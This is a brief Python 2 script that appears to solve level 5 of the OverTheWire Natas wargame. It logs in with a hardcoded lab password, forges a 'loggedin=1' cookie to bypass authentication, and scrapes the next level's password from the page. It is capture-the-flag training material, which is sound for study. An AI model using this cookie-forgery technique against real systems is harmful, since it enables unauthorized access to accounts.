import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
url = 'http://%s.natas.labs.overthewire.org' % username
cookies = {"loggedin" : "1"}

session = requests.Session()
response = session.get(url, auth = (username, password), cookies = cookies)
content = response.text

#print content

print re.findall('Access granted. The password for natas6 is (.*)</div>', content)[0]